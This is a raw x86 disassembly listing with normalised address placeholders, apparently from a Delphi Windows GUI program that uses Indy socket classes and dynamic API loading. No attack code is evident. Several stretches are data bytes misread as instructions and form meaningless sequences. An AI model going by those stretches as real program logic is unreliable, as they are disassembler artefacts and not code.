mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_45ae40
mov [ ebp - 0x4 ] eax
sub_45af6a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_45afa4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403104
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_40304c
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45b004
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_45b09e
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b0a5
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403f44
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41d99c
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c104
mov ebx eax
inc ebx
sub_45b0b0
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4047c0
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_45b436
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45ae18
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_45ac20
jmp r-xdata
call sub_4512e8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b43d
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403e78
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404890
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_438bf8
call sub_458930
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_45ae50
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_457cf4
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_439cec
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_439e90
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4588f8
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_437418
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_403eec
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_43b4f4
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_45afa4
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403300
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_439e64
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_439e64
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_43a4ec
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_458a44
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_45b004
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_45ac20
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_45ac20
jmp r-xdata
sub_45b444
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403ea8
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403ea8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45b480
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_43b4f4
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_43b4f4
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_446c20
sub_45b510
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_45b538
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_45b5dc
add [ eax ] eax
add [ eax ] al
loopne r-xdata
add [ ebx + 0x28 ] esi
mov eax sub_45b5dc
call sub_403c28
call sub_45b560
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_451314
call sub_413860
retn
inc esi
add [ edx + ebp * 2 + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45b63f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b646
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_451094
mov eax sub_451314
call sub_4138a0
mov eax [ rw-data ]
push eax
call CloseHandle
sub_45b711
mov dh 0x45
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
adc eax 0x49644945
outsb
jbe r-xdata
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
insb
imul esp [ ebx + edx * 2 + 0x65 ] 0x63697672
dec esi
popad
insd
mov eax eax
cwde
mov bh 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 + 0x100045 ] bl
add [ eax ] al
pop ebx
pop ebp
retn 0x4
jb r-xdata
cmp dl 0xff
jmp r-xdata
outsd
jb r-xdata
retn
sub_45b7ac
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40b520
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_45b7f4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45b819
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b820
retn
sub_45b82c
xchg [ fs : esi ] al
idiv dh
add [ eax ] al
xchg [ fs : esi ] al
idiv esi
add [ eax ] al
xchg [ fs : esi ] al
clc
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax + 0x550000fe ] dh
mov ebp esp
xor eax eax
push ebp
push sub_45ba29
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ba30
retn
sub_45bab4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45bb54
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_403ea8
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_403428
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40ad18
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_403ea8
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4041d4
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_40b520
mov ecx edi
xor edx edx
mov eax ebx
call sub_40b520
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bb5b
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403e78
retn
sub_45bb5b
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_45c938
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_45c9db
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ eax + eax * 2 ]
lea ebx [ eax * 4 + rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
mov eax [ ebx + 0x4 ]
mov [ eax ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c9e2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
push 0x276d
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b8
mov eax [ ebp - 0x8 ]
mov edx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] 0x6
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408be0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45bab4
call sub_403890
sub_45c9ec
push ebx
xor eax eax
mov [ rw-data ] eax
mov ecx 0x70
mov eax rw-data
mov edx eax
mov ebx [ edx + 0x4 ]
mov edx [ edx ]
mov [ ebx ] edx
add eax 0xc
dec ecx
jne r-xdata
pop ebx
retn
sub_45ca10
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45cadd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov ax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
call GetLastError
push eax
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b8
mov eax [ ebp - 0x8 ]
push eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
pop eax
call sub_408be0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45bab4
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cae4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
sub_45cb1b
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45cb48
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cb4f
retn
call sub_45bb8c
sub_45cb64
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45cb89
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cb90
retn
sub_45cb9c
call sub_46116c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh

sub_45cbbe
inc ebp
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x4c004010 ]
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xf4004030
xor [ eax ] al
inc eax
sub [ eax ] eax
inc eax
sub [ eax ] eax
inc eax
sub [ eax ] eax
inc eax
sub [ eax ] eax
or eax 0x53644954
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add ah bh
rol [ ebp ] cl
inc eax
sub [ eax ] eax
inc eax
sub [ eax ] eax
inc eax
sub [ eax ] eax
aam 0xce
inc ebp
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add ah dh
into
inc ebp
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] dl
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push ebx
je r-xdata
imul esi [ ebx + 0x74 ] 0xcc54c08b
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
int3
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx * 8 + 0xc0045 ] bl
add [ eax ] al
hlt
arpl [ ebx - 0x70 ] bp
inc eax
int 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x33 ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
sub_45cd1d
mov dh 0x45
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
or eax 0x53644945
je r-xdata
je r-xdata
arpl [ ebx + 0x45 ] bp
jb r-xdata
je r-xdata
popad
insb
imul edi [ edx + 0x61 ] 0x6e6f6974
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x800408d
into
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
into
inc ebp
add [ eax + eax ] cl
add [ eax ] al
hlt
outsd
jb r-xdata
add [ eax ] al
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
imul edi [ edx + 0x65 ] 0x65637845
push 0xffffffff
lea ecx [ esp + 0x4 ]
call sub_45ce2c
retn
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ eax ] al
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push ebx
je r-xdata
rcr [ ebp + ecx * 8 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx * 8 + 0xc0045 ] bl
add [ eax ] al
hlt
inc ebp
add [ eax ] al
add [ eax ] al
arpl [ ebx - 0x70 ] bp
inc eax
int 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x33 ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
sub_45ce2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi eax
xor ebx ebx
inc edx
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
mov [ esi + 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov edx [ esi + 0x4 ]
mov eax esi
call sub_45ce74
inc edx
mov eax edi
add eax 0x4
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_45ce74
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45cec6
push [ fs : eax ]
